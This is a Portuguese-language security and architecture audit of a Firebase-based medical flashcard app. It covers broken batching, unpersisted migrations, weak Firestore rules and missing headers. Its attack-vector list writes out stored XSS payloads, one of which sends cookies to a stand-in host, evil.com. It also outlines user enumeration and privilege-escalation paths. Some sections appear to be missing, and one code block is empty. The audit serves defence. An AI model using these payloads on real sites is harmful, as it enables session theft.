## AUDITORIA GERAL — Resumo Executivo

> [!CAUTION]
> **O projeto NÃO está pronto para produção.** Existem falhas estruturais graves que impedem um deploy seguro.

O BARCL é um sistema de flashcards médicos (Pneumologia/Neumologia) construído com Firebase + Vanilla JS modular. A arquitetura demonstra **ambição técnica legítima** — há patterns de Repository, DTOs congelados, Schema Versioning, Migration Engine, Event Bus, Guards de Auth/Role, Audit Logs, e um design system tokenizado. **Porém, a execução está severamente fragmentada.**

O problema central do projeto pode ser resumido em uma frase:

**Existem DUAS aplicações dentro do mesmo repositório que nunca foram unificadas — uma legacy/localStorage e outra Firebase — e o código ativo ignora completamente a arquitetura modular que foi construída.**

O resultado é:
- ~60% do código modular está **morto** (nunca importado, nunca executado)
- Dois data models incompatíveis coexistem (`prompt` vs `question`, `images[]` vs `imageUrl`)
- O progresso é salvo em DOIS lugares (localStorage E Firestore) sem sincronização
- A camada de Firestore tem bugs fundamentais que a tornam não-funcional em alguns cenários
- XSS vulnerabilities existem em pelo menos 6 componentes UI
- Memory leaks por event listeners acumulados em cada render

## PONTOS FORTES

Somente os pontos realmente sólidos, com justificativa técnica:

1. **Custom Claims para autorização** — O sistema usa JWT claims (`admin: true`) em vez de campos Firestore para controle de acesso. Isso é a abordagem correta e mais segura, pois as claims são verificadas server-side nas Security Rules e não podem ser modificadas pelo cliente.

2. **Catch-all deny rules** — Tanto `firestore.rules` quanto `storage.rules` têm regras catch-all `allow read, write: if false` no final. Isso garante que paths não explicitamente permitidos são bloqueados por padrão (deny-by-default).

3. **Rollback na registration** — O `auth.service.js` implementa rollback correto: se a criação do perfil Firestore falha após criar o usuário Auth, o usuário Auth é deletado (`deleteUser`). Isso é uma boa prática para evitar entidades órfãs.

4. **Design token system** — O `tokens.css` define variáveis CSS para tipografia, cores, espaçamento, motion e shadows de forma consistente. Boa base para escalabilidade visual.

5. **Email verification enforcement** — O guard de auth verifica `user.emailVerified`, e as Firestore rules (progress subcollection) exigem `isEmailVerified()`. Isso é uma camada de proteção real.

6. **Audit logs append-only** — As Firestore rules impedem update e delete em `audit_logs`. Uma vez criado, o log é imutável. Pattern correto para auditoria.

7. **Runtime environment injection** — Configuração Firebase via `window.__BARCL_ENV__` gerado por script, não hardcoded. Permite diferentes ambientes sem rebuild.

8. **Offline persistence configurada** — `enableIndexedDbPersistence` está implementado (embora com API deprecated).

- Dados carregados de Firestore podem ser manipulados por admin malicioso

### C8. Seed Script Batch Bug

```javascript
// seed-firestore.js
const batch = db.batch();  // ← Um único batch
// ... adiciona N documentos ...
if (count === 400) {
  await batch.commit();  // ← Committa o batch
  // ← CONTINUA USANDO O MESMO batch object!
  // Firestore batches são one-shot — após commit, são invalidados
}
```

Após o primeiro commit de 400 docs, o batch object é inválido. Documentos subsequentes são silenciosamente perdidos ou geram erros.

### C9. Migration Engine Nunca Persiste Migrações

```javascript
// migration-engine.js — migrations são read-only

return migratedData;  // retorna — MAS NUNCA SALVA NO FIRESTORE
```

A migration roda em CADA leitura, transformando dados in-memory sem persistir de volta. O documento fica eternamente em `schemaVersion: 0`. **Overhead infinito sem progresso real.**

### C10. `enableIndexedDbPersistence` é Deprecated

```javascript

```

Esta API foi deprecated no Firebase SDK v10+. Deve usar `initializeFirestore` com `persistentLocalCache` e `persistentMultipleTabManager`. **Pode parar de funcionar em qualquer update do SDK.**

## PROBLEMAS IMPORTANTES

> [!WARNING]
> Problemas relevantes que impactam confiabilidade e manutenção, mas não são bloqueantes imediatos.

### I1. Nenhum Schema Validation Enforced nos Repositories

Nenhum repository chama `validateFlashcard()`, `validateUser()`, ou o `Validator` antes de escrever no Firestore. **Dados arbitrários passam direto.**

### I2. Firestore Rules Sem Field-Level Validation no User Create

```
allow create: if isAuthenticated() && request.auth.uid == userId 
  && request.resource.data.role == 'student';
```

Verifica `role == 'student'`, mas **não impede campos extras** (ex: `isAdmin: true`, `customPermission: 'all'`). Qualquer campo adicional é aceito silenciosamente.

### I3. Audit Logging é Spoofável

O `userId` no audit log vem do parâmetro passado pelo chamador, não do `auth.currentUser.uid`. Um usuário pode logar ações como outro usuário.

Além disso, usa `new Date().toISOString()` em vez de `serverTimestamp()` — timestamp manipulável pelo cliente.

### I4. Progress Repository Valida DEPOIS de Escrever

```javascript
// progress.repository.js
await setDoc(docRef, progressData, { merge: true });  // ← Salva primeiro
validateProgress(progressData);  // ← Valida depois (!!!)
```

Dados corrompidos são persistidos antes da validação.

### I5. `setCustomUserClaims` Sobrescreve TODAS as Claims

```javascript
// bootstrap-admin.js
await auth.setCustomUserClaims(userRecord.uid, { admin: true });
// ← Se o user tinha { beta: true, premium: true }, agora só tem { admin: true }
```

### I6. Nenhum Security Header no Hosting

Sem CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy. O app é vulnerável a:
- XSS (sem CSP para mitigar)
- Clickjacking (sem X-Frame-Options)
- MIME sniffing (sem X-Content-Type-Options)

### I7. `service-account.json` Sem Proteção no `.gitignore`

Nenhum pattern para service account keys no `.gitignore`. Se alguém colocar `serviceAccountKey.json` ou `barcl-6e65e-firebase-adminsdk-*.json` no repo, será commitado.

### I8. Logger Hardcoded com `IS_DEV = true` em Produção

```javascript
const IS_DEV = true; // ← Em produção, todos os info logs são emitidos
```

### I9. Storage Rules Sem Validação de Tipo/Tamanho de Arquivo

```
match /{allPaths=**} {
  allow read: if isEmailVerified();
  allow write: if isAdmin() && isEmailVerified();
}
```

Admin pode upload de QUALQUER tipo de arquivo, QUALQUER tamanho. Sem limites de content-type ou size.

### I10. `data.js` Contém HTML Raw nos `explanation` Fields

```javascript
explanation: "<p><strong>Broncograma aéreo</strong> é a visualização das vias aéreas...</p>"
```

Se renderizado com `innerHTML` (e é), isso funciona — mas **estabelece um pattern perigoso** onde qualquer conteúdo é tratado como HTML confiável.

### I11. Login Page Permite User Enumeration

Mensagens de erro diferenciadas: `'Usuário não encontrado'` vs `'Senha incorreta'` permitem a um atacante distinguir emails registrados de não-registrados.

### I12. No Test Framework

Zero testes. Sem unit tests, sem integration tests, sem e2e tests. Nenhum `jest`, `vitest`, `playwright`, ou `cypress` instalado.

### I13. Race Condition no Registration

```
createUserWithEmailAndPassword → (user existe no Auth)
↓ ← WINDOW: user existe sem perfil Firestore
UsersRepository.createUser → (perfil Firestore criado)
```

Se o browser crashar entre as duas operações, existe um Auth user sem Firestore profile. O rollback existe mas depende de execução sem interrupção.

### I14. Duas Keydown Listeners Conflitantes

`src/js/app.js` registra DOIS `document.addEventListener('keydown')` — um para Space/Enter e outro para Escape. Ambos persistem indefinidamente sem cleanup.

## RISCOS FIREBASE

### Firestore

1. **`system` collection world-readable** — Expõe metadados do sistema sem autenticação
2. **Sem field validation em rules** — User documents aceitam campos arbitrários
3. **Sem composite index para `getAllAdmin()`** — Query `orderBy('createdAt', 'desc')` vai falhar sem index
4. **`enableIndexedDbPersistence` deprecated** — API pode ser removida em futuras versões do SDK
5. **Sem App Check** — Nenhuma proteção contra abuse automatizado
6. **Sem offline queue** — Writes offline não são queued; são perdidos silenciosamente

### Storage

1. **Sem limites de upload** — Admin pode fazer upload de qualquer tipo/tamanho de arquivo
2. **Sem path structure enforcement** — Arquivos podem ser escritos em qualquer path sob a regra catch-all

### Auth

1. **Claims stale por até 1h** — Após revogar admin, o user mantém access até token refresh
2. **Sem brute force protection client-side** — Depende apenas do rate limiting do Firebase
3. **Sem multi-factor authentication** — Auth apenas por email/password

### Hosting

1. **Project root como `public`** — Potencial exposição de arquivos sensíveis
2. **Sem security headers** — Vulnerável a XSS, clickjacking, MIME sniffing

## RISCOS DE SEGURANÇA

### Vetores de Ataque

1. **Stored XSS via flashcard content** — Admin cria card com `question: '<img src=x onerror=alert(document.cookie)>'`. Todo user que vê o card é afetado.

2. **Stored XSS via displayName** — User registra com `displayName: '<script>fetch("evil.com?c="+document.cookie)</script>'`. Renderizado em `auth-ui.js` e `app.js`.

3. **User enumeration** — Login com email inexistente retorna mensagem diferente de senha incorreta. Permite mapear emails registrados.

4. **System config exfiltration** — `system/{document=**}` é legível sem auth. Se conter feature flags, endpoints internos, ou configurações, ficam expostos.

5. **Firestore document field injection** — User pode adicionar campos arbitrários ao próprio documento (`isAdmin: true`, `bypass: true`). Se qualquer lógica futura ler esses campos sem whitelist, é privilege escalation.

6. **Audit log pollution** — Authenticated user pode criar entries arbitrárias em `audit_logs` com userId spoofado (se as rules permitirem `create` para authenticated users).

7. **Storage abuse** — Admin (ou se credentials vazarem) pode fazer upload de arquivos sem limites de tipo ou tamanho.

## ANÁLISE DE ARQUITETURA

### Separação de Responsabilidades: ⚠️ Fragmentada

A **intenção** da arquitetura é sólida:
```
pages/ → guards/ → services/ → repositories/ → schemas/ → Firestore
  ↕        ↕
  ui/    features/
  ↕
core/ (state, event-bus, storage, logger, validator)
```

A **realidade** é:
```
src/js/app.js → (faz tudo inline, ignora 80% dos módulos)
```

### Acoplamento: 🔴 Alto

- `app.js` importa diretamente Firebase SDK, repositories, schemas, e manipula DOM — tudo no mesmo arquivo
- `State` controller importa `data.js` (61KB) diretamente — acoplado ao dataset
- Admin page importa Firebase Storage SDK diretamente do CDN em vez de usar `firebase.service.js`

### Inversão de Dependência: 🔴 Inexistente

Não há interfaces abstratas. `FlashcardsRepository` é usado diretamente, sem injection. Trocar Firestore por outro backend requer reescrever todos os consumers.

### Boundaries: ⚠️ Inconsistentes

- DTOs existem mas não são enforced nos repositories
- Guards existem mas têm bugs (promises que não rejeitam em versões alternativas)
- Validators existem mas não são usados
